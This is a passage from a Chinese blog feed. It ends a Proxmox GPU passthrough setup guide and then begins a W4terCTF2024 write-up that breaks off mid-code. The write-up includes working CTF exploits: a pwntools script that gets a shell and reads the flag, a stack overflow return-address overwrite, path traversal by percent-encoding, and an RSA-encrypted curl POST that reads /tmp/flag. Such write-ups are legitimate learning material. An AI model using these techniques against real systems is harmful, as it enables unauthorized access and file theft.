<code>&quot;...&quot;</code>  原来的内容后面增加这些内容，其中：</p>\n<ul>\n<li><code>quiet</code>  一般是原来就有的</li>\n<li><code>intel_iommu=on</code>  和  <code>iommu=pt</code>  是必须的</li>\n<li><code>video=efifb:off</code>  如果你是给 Windows VM 直通显卡串流玩游戏的话是需要的</li>\n</ul>\n<p>然后更新配置文件：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update-grub</span><br></pre></td></tr></table></figure></p>\n<p>检查 IOMMU 是否启动：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dmesg | grep -e DMAR -e IOMMU</span><br></pre></td></tr></table></figure></p>\n<p>看到有 DMAR 或 IOMMU 输出就行，例如我们就只看到了 DMAR 的输出。</p>\n<h2 id=\"配置显卡\"><a class=\"anchor\" href=\"#配置显卡\">#</a> 配置显卡</h2>\n<p>找到自己的显卡的相关信息：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lspci -knn | grep VGA</span><br></pre></td></tr></table></figure></p>\n<p>我们需要如下内容：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01:00.0 VGA compatible controller [0300]: NVIDIA Corporation GM107 [GeForce GTX 745] [10de:1382] (rev a2)</span><br><span class=\"line\">        Subsystem: NVIDIA Corporation GM107 [GeForce GTX 745] [10de:1065] # these ids</span><br><span class=\"line\">        Kernel modules: nvidiafb, nouveau # these modules</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>[10de:1065]</code>  是  <code>&lt;vendor id&gt;:&lt;device id&gt;</code>  形式的厂商 id 和设备 id</li>\n<li><code>nvidiafb</code>  和  <code>nouveau</code>  是我们的显卡所使用的驱动模块</li>\n</ul>\n<p>将厂商 id 和设备 id 组合添加到 vfio 配置文件中：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nano /etc/modprobe.d/vfio.conf</span><br></pre></td></tr></table></figure></p>\n<p>增加如下内容：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">options vfio-pci ids=10de:1382 disable_vga=1</span><br></pre></td></tr></table></figure></p>\n<p>如果你有多张显卡需要直通，那么不同显卡对应的  <code>&lt;vendor id&gt;:&lt;device id&gt;</code>  就以逗号分隔加在  <code>ids=</code>  后面即可，例如：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">options vfio-pci ids=1145:1400,1919:1800 disable_vga=1</span><br></pre></td></tr></table></figure></p>\n<p>屏蔽显卡驱动模块：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;blacklist &lt;some-module&gt;&quot; &gt;&gt; /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure></p>\n<p>对每一个模块都需要加单独一行，例如我们是  <code>nvidiafb</code>  和  <code>nouveau</code>  ，则需要：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;blacklist nvidiafb&quot; &gt;&gt; /etc/modprobe.d/blacklist.conf</span><br><span class=\"line\">echo &quot;blacklist nouveau&quot; &gt;&gt; /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>有一些教程说是修改配置文件  <code>/etc/modprobe.d/pve-blacklist.conf</code>  ，但是官方文档（目前）说的是  <code>/etc/modprobe.d/blacklist.conf</code>  ，两者不知道有没有区别</p>\n</blockquote>\n<h2 id=\"vfio\"><a class=\"anchor\" href=\"#vfio\">#</a> vfio</h2>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nano /etc/modules</span><br></pre></td></tr></table></figure></p>\n<p>增加如下几行：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vfio</span><br><span class=\"line\">vfio_iommu_type1</span><br><span class=\"line\">vfio_pci</span><br><span class=\"line\">vfio_virqfd #not needed if on kernel 6.2 or newer</span><br></pre></td></tr></table></figure></p>\n<p>最后执行如下指令，并且重启：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update-initramfs -u -k all</span><br></pre></td></tr></table></figure></p>\n<p>最后使用如下指令检查配置是否成功：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lspci -k</span><br></pre></td></tr></table></figure></p>\n<p>预期是得到对应的显卡部分有如下输出结果：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01:00.0 VGA compatible controller: NVIDIA Corporation GP108 [GeForce GT 1030] (rev a1)</span><br><span class=\"line\">        Subsystem: Micro-Star International Co., Ltd. [MSI] GP108 [GeForce GT 1030]</span><br><span class=\"line\">        Kernel driver in use: &lt;some-module&gt; # 预期是 vfio</span><br><span class=\"line\">        Kernel modules: &lt;some-module&gt;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"问题\"><a class=\"anchor\" href=\"#问题\">#</a> 问题</h3>\n<p>执行最后一句指令时，我们却遇到了这个输出：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">Re-executing &#x27;/etc/kernel/postinst.d/zz-proxmox-boot&#x27; in new private mount namespace..</span><br><span class=\"line\">No /etc/kernel/proxmox-boot-uuids found, skipping ESP sync.</span><br></pre></td></tr></table></figure></p>\n<p>然后  <code>lspci -k</code>  检查也没有预期的输出，虚拟机添加显卡设备后无法开机。</p>\n<p>我尝试了<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wdmUucHJveG1veC5jb20vcHZlLWRvY3MvY2hhcHRlci1xbS5odG1s\">官方文档</span>中 Host Device Passthrough 部分的方法：</p>\n<div class=\"note information\">\n<p>For both methods you need to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wdmUucHJveG1veC5jb20vcHZlLWRvY3MvY2hhcHRlci1xbS5odG1sI3FtX3BjaV9wYXNzdGhyb3VnaF91cGRhdGVfaW5pdHJhbWZz\">update the initramfs</span> again and reboot after that.</p>\n<p>Should this not work, you might need to set a soft dependency to load the gpu modules before loading <em>vfio-pci</em>. This can be done with the <em>softdep</em> flag, see also the manpages on <em>modprobe.d</em> for more information.</p>\n<p>For example, if you are using drivers named  <code>&lt;some-module&gt;</code>  :</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;softdep &lt;some-module&gt; pre: vfio-pci&quot;</span> &gt;&gt; /etc/modprobe.d/&lt;some-module&gt;.conf</span></span><br></pre></td></tr></table></figure></p>\n</div>\n<p>但仍然没有效果。</p>\n<p>所幸，似乎有不少人也遇到了这个问题，我找到了<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS5wcm94bW94LmNvbS90aHJlYWRzL3Byb2JsZW0td2l0aC1wYXNzLXRocm91Z2gtY2Fubm90LWNoYW5nZS1pbml0cmFtZnMuMTI2NjI3Lw==\">这个帖子</span>，似乎说是因为没有同步连接 ESP 导致的，接下来我按照里面一个解决方案走：</p>\n<p>然后我先尝试了重新挂载  <code>/boot/efi</code>  ，首先  <code>lsblk -o +FSTYPE</code>  查看  <code>/boot/efi</code>  挂载的磁盘分区，例如我这里是  <code>sda2</code>  ，然后重新挂载一下：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">umount /boot/efi</span><br><span class=\"line\">proxmox-boot-tool init /dev/sda2</span><br></pre></td></tr></table></figure></p>\n<p>然后先前类似  <code>No /etc/kernel/proxmox-boot-uuids found, skipping ESP sync.</code>  的输出就没有了，最后成功了。</p>\n<h1 id=\"vm-配置\"><a class=\"anchor\" href=\"#vm-配置\">#</a> VM 配置</h1>\n<p>选中 VM ，在 == 硬件（Hardware）== 部分中，== 机型（Machine）== 应该（尽量）选择 <mark>q35</mark> 类型，如果不是的话可以在关机状态下修改。</p>\n<p>然后还是在<mark>硬件（Hardware）<mark>部分，点击</mark>添加（add）</mark>，选择 <mark>PCI</mark> 设备，找到自己的显卡添加设备。</p>\n<p>或者 CLI 版本操作：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qm set VMID -hostpci0 00:02.0</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">or add these to vm config file:</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">hostpci0: 00:02.0</span></span><br></pre></td></tr></table></figure></p>\n<p>启动虚拟机，一切无误的话就能够正常启动，然后在虚拟机中就可以当作真实物理机插着显卡进一步安装驱动操作啦</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "PVE",
                "DevOps"
            ]
        },
        {
            "id": "https://taf.fyi/cs/ctf/w4terctf2024/",
            "url": "https://taf.fyi/cs/ctf/w4terctf2024/",
            "title": "W4terCTF2024 WP",
            "date_published": "2024-05-04T16:00:00.000Z",
            "content_html": "<p>年轻人的第一场 CTF ，学到了很多，比较走运拿了第五。最遗憾的是密码学板块了，认真学了不少抽象代数但还是没有做出几题。</p>\n<p><img data-src=\"/assets/cs/ctf/w4terctf2024/rank.png\" alt=\"rank\" /></p>\n<p>队友们：（我起了个整活队名，其实是抄袭另一个叫做 “憧憬成为 CTFer” 的 ）</p>\n<p><img data-src=\"/assets/cs/ctf/w4terctf2024/team.jpg\" alt=\"team\" /></p>\n<h1 id=\"ai\"><a class=\"anchor\" href=\"#ai\">#</a> AI</h1>\n<h2 id=\"network-reverse\"><a class=\"anchor\" href=\"#network-reverse\">#</a> Network Reverse</h2>\n<p>网络结构长这样：</p>\n<p><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sequential(</span><br><span class=\"line\">  (<span class=\"number\">0</span>): Conv2d(<span class=\"number\">3</span>, <span class=\"number\">4</span>, kernel_size=(<span class=\"number\">2</span>, <span class=\"number\">2</span>), stride=(<span class=\"number\">1</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">  (<span class=\"number\">1</span>): GELU(<span class=\"name\">approximate=</span>&#x27;none&#x27;)</span><br><span class=\"line\">  (<span class=\"number\">2</span>): Conv2d(<span class=\"number\">4</span>, <span class=\"number\">8</span>, kernel_size=(<span class=\"number\">5</span>, <span class=\"number\">5</span>), stride=(<span class=\"number\">1</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">  (<span class=\"number\">3</span>): GELU(<span class=\"name\">approximate=</span>&#x27;none&#x27;)</span><br><span class=\"line\">  (<span class=\"number\">4</span>): MaxPool2d(<span class=\"name\">kernel_size=3</span>, stride=3, padding=0, dilation=1, ceil_mode=False)</span><br><span class=\"line\">  (<span class=\"number\">5</span>): Linear(<span class=\"name\">in_features=412</span>, out_features=1848, bias=True)</span><br><span class=\"line\">  (<span class=\"number\">6</span>): Conv2d(<span class=\"number\">8</span>, <span class=\"number\">1</span>, kernel_size=(<span class=\"number\">1</span>, <span class=\"number\">1</span>), stride=(<span class=\"number\">1</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">  (<span class=\"number\">7</span>): Tanh()</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure></p>\n<p>首先，卷积和池化层只会在图像中的一个较小的局部内用某种方式抹一把，并不会比如说把 W 的上半部分丢到另一个地方去，<strong>不会破坏可辨识的字体形状</strong>，所以卷积和池化层可以直接当做不存在。</p>\n<p>第一层 <code>atan()</code>  没有难度，第三层给 <code>weight</code>  求个逆即可逆向：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reverse</span>(<span class=\"params\">ts</span>):</span><br><span class=\"line\">    ts = torch.atanh(ts)</span><br><span class=\"line\">    C = ts</span><br><span class=\"line\">    A = net[<span class=\"number\">5</span>].weight.transpose(<span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    ts = C @ torch.pinverse(A)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ts</span><br></pre></td></tr></table></figure></p>\n<p>上面这个函数逆向出来长这样：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/mUBcnEN2zCRShaO.png\" alt=\"network-reverse1\" /></p>\n<p>感觉行之间的梯度非常小，不如来个竖直方向的锐化滤波器试试？</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mat = np.array(reverse(tensor).detach().numpy()[<span class=\"number\">0</span>])</span><br><span class=\"line\">kernel = np.array([[<span class=\"number\">0</span>, -<span class=\"number\">1</span>, <span class=\"number\">0</span>], [<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>], [<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>]], dtype=np.float32)</span><br><span class=\"line\">filtered = cv2.filter2D(mat, -<span class=\"number\">1</span>, kernel)</span><br><span class=\"line\"></span><br><span class=\"line\">plt.imshow(filtered, cmap=<span class=\"string\">&#x27;gray&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/qiCOuyBTSU7KXw6.png\" alt=\"network-reverse2\" /></p>\n<p>啊？</p>\n<h1 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> Pwn</h1>\n<h2 id=\"remember-it-0\"><a class=\"anchor\" href=\"#remember-it-0\">#</a> Remember It 0</h2>\n<p>签到题，自动化脚本获取 flag：</p>\n<p><figure class=\"highlight python\"><figcaption><span>ipynb</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">50184</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice: &quot;</span>, drop=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    p.send(<span class=\"string\">&quot;1\\n&quot;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;: &quot;</span>, drop=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    x = p.recvuntil(<span class=\"string\">&quot;\\x08&quot;</span>, drop=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;plz input your answer\\n&quot;</span>, drop=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    x = x[:-<span class=\"number\">1</span>].decode(<span class=\"string\">&#x27;utf-8&#x27;</span>) + <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    p.send(x)</span><br><span class=\"line\">p.send(<span class=\"string\">&quot;cat flag\\n&quot;</span>)</span><br><span class=\"line\">flag = p.recvuntil(<span class=\"string\">&quot;&#125;&quot;</span>, drop=<span class=\"literal\">False</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure></p>\n<p><code>W4terCTF&#123;THOU9h_l_Hav3_tO_SAy_g0oD8y3~&#125;</code></p>\n<h2 id=\"remember-it-1\"><a class=\"anchor\" href=\"#remember-it-1\">#</a> Remember It 1</h2>\n<p>无保护，可以栈溢出。</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/qcsDAJHgp5bZNeR.png\" alt=\"Remember-It-1-1\" /></p>\n<p><code>read</code>  一次读 32 字节，缓冲区有 10 * 32 字节，按理来说只有十轮游戏就不会越界，然而并没有超过十轮退出游戏的逻辑，十轮之后可以接着下一轮，这时读到的东西就越过缓冲区了。</p>\n<p>比较菜，没用明白 <code>pwntools</code> ，是手搓十六进制编辑器作为输入，开着 gdb 一点一点试出来的。payload 如下：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/nU18YoKDFALga5s.png\" alt=\"Remember-It-1-2\" /></p>\n<p>前面是一堆 <code>1\\nAAAABBBB...\\n</code>  用来跳过前十轮，第十一轮读指针已经位于栈顶附近，把 <code>FEE1DEAD</code>  的地址 <code>0xB61840</code>  放在 <code>$rbp</code>  指向的位置，然后用垃圾填满 32 字节结束本次 <code>read</code> ，下一轮选 4 退出游戏， <code>main</code>  返回，就会到达 <code>FEE1DEAD</code> 。</p>\n<h2 id=\"2048\"><a class=\"anchor\" href=\"#2048\">#</a> 2048</h2>\n<p>ISTG 我真的只是随便敲了一坨输入进去，然后直接弹了句 <code>sh: 1: xxxxxx: not found</code>  给我整不会了。</p>\n<p>下面是可以稳定 getshell 的 payload：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/e5u37tTcN1jqFOy.png\" alt=\"2048\" /></p>\n<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"gitzip\"><a class=\"anchor\" href=\"#gitzip\">#</a> GitZip</h2>\n<p>重新做了一遍：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/cTfr4Qmi1jK5zeN.png\" alt=\"gitzip1\" /></p>\n<p>漏洞大概是这里：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/j5ZdYeMpEIBiL2a.png\" alt=\"gitzip2\" /></p>\n<p>要把 <code>.</code>  和 <code>/</code>  都用 <code>%</code>  编码才能过， <code>/</code>  也要编码是我没想到的，大概是针对每一层 <code>/</code>  的处理会包含一些奇怪的特殊步骤，需要把 <code>/</code>  编码掉来跳过这些步骤，让完整的路径字符串直达 <code>req.params.htmlname</code> 。</p>\n<h2 id=\"ashbp\"><a class=\"anchor\" href=\"#ashbp\">#</a> ASHBP</h2>\n<p>查看源代码，首先全局搜索  <code>flag</code>  ，马上就找到可以直接得到 flag 的  <code>get_flag</code>  函数：</p>\n<p><figure class=\"highlight php\"><figcaption><span>download.php</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_flag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"title function_ invoke__\">rsa_decrypt</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>]));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>同时在  <code>init.sh</code>  中可以看到 flag 的位置：</p>\n<p><figure class=\"highlight bash\"><figcaption><span>init.sh</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$GZCTF_FLAG</span> &gt; /tmp/flag</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 444 /tmp/flag</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">unset</span> GZCTF_FLAG</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">base64</span> /var/www/html/src/rsa.pem &gt; /var/www/html/src/rsa_base64.pem</span><br><span class=\"line\"><span class=\"built_in\">base64</span> /var/www/html/src/rsa_pub.pem &gt; /var/www/html/src/rsa_pub_base64.pem</span><br><span class=\"line\"></span><br><span class=\"line\">php-fpm -D</span><br><span class=\"line\">nginx -g <span class=\"string\">&#x27;daemon off;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p>flag 位置为  <code>/tmp/flag</code>  ；</p>\n<p>全局搜索  <code>get_flag</code>  找到调用该函数的地方：</p>\n<p><figure class=\"highlight php\"><figcaption><span>admin.php</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">......</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;rsa.php&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;download.php&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cre&#x27;</span>])&#123;    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">rsa_decrypt</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cre&#x27;</span>])!=<span class=\"string\">&#x27;admin&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;凭据无效！&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">get_flag</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>查看  <code>rsa_decrypt</code>  解密的逻辑：</p>\n<p><figure class=\"highlight php\"><figcaption><span>rsa.php</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">rsa_decrypt</span>(<span class=\"params\"><span class=\"variable\">$endata</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//私钥解密</span></span><br><span class=\"line\">    <span class=\"variable\">$private_key</span> = <span class=\"title function_ invoke__\">openssl_pkey_get_private</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(PRIVATE_PATH));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"variable\">$private_key</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;私钥不可用&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$return_de</span> = <span class=\"title function_ invoke__\">openssl_private_decrypt</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$endata</span>), <span class=\"variable\">$decrypted</span>, <span class=\"variable\">$private_key</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"variable\">$return_de</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>(<span class=\"string\">&#x27;解密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$decrypted</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>下载公钥  <code>rsa_pub.pem</code>  ，RSA 加密后再 base64 加密  <code>admin</code>  和  <code>/tmp/flag</code>  ，分别作为  <code>cre</code>  和  <code>flag</code>  ， POST 获取 flag ：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>hack.sh</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export cre=$(echo admin | openssl rsautl -encrypt -inkey rsa_pub.pem -pubin | base64)</span><br><span class=\"line\"></span><br><span class=\"line\">export flag=$(echo flag | openssl rsautl -encrypt -inkey rsa_pub.pem -pubin | base64)</span><br><span class=\"line\"></span><br><span class=\"line\">curl -X POST -F &quot;cre=$cre&quot; -F &quot;flag=$flag&quot; http://127.0.0.1:50741/admin.php</span><br></pre></td></tr></table></figure></p>\n<p><code>W4terCTF&#123;Unl0ck_7he_sECreTs_O1_tHE_s1MPle_hOMEw0rk_SUbm1Ssion_PLATfoRM&#125;</code></p>\n<h2 id=\"user-manager\"><a class=\"anchor\" href=\"#user-manager\">#</a> User Manager</h2>\n<p><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">r.GET(<span 